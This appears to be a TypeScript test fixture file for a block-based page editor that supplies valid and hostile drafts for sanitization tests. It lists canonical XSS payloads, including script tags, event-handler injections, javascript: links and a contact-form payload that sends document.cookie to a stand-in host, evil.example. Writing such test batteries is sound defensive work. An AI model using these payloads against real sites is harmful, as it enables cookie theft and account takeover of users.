/**
 * Block fixtures — STEP 15 (editor test data, deterministic).
 *
 * NOTE: these are PLAIN objects matching the renderer's EditorBlock shape
 * (re-declared here to keep the testing package app-agnostic). The hostile
 * payloads are the canonical XSS battery — reuse them in any new
 * sanitization surface.
 */

export interface FixtureBlock {
  id: string;
  type: 'heading' | 'paragraph' | 'image' | 'quote' | 'button' | 'divider' | 'spacer';
  text?: string;
  marks?: Array<{ start: number; end: number; kind: 'bold' | 'italic' }>;
  links?: Array<{ start: number; end: number; href: string }>;
  mediaId?: string;
  altText?: string;
  label?: string;
  href?: string;
  size?: 1 | 2 | 3 | 4;
}

/** A small VALID draft (well within all STEP-14 constraints). */
export function validBlocks(): FixtureBlock[] {
  return [
    { id: 'b1', type: 'heading', text: 'Sveiki atvykę' },
    { id: 'b2', type: 'paragraph', text: 'Parapijos gyvenimo naujienos ir renginiai.' },
    { id: 'b3', type: 'image', mediaId: 'media-1', altText: 'Bažnyčios fasadas' },
    { id: 'b4', type: 'divider' },
  ];
}

/** Canonical XSS payloads — every sanitization surface must defuse all. */
export const XSS_PAYLOADS: readonly string[] = [
  '<script>alert("xss")</script>',
  '<img src=x onerror=alert(1)>',
  '"><svg onload=alert(1)>',
  '<iframe src="https://evil.example"></iframe>',
  '<a href="javascript:alert(1)">click</a>',
  '<body onload=alert(1)>',
  "'-alert(1)-'",
  '<style>@import "https://evil.example";</style>',
];

/** Hostile draft: XSS text, unsafe link, missing alt. */
export function hostileBlocks(): FixtureBlock[] {
  return [
    { id: 'h1', type: 'paragraph', text: XSS_PAYLOADS[0] },
    { id: 'h2', type: 'paragraph', text: 'link', links: [{ start: 0, end: 4, href: 'javascript:alert(1)' }] },
    { id: 'h3', type: 'image', mediaId: 'm1' }, // missing alt text
  ];
}

/** Contact-form payloads (CRM lead surface). */
export const CONTACT_XSS_PAYLOADS: readonly string[] = [
  '<script>fetch("https://evil.example?c="+document.cookie)</script>',
  '"><img src=x onerror=alert(document.domain)>',
];
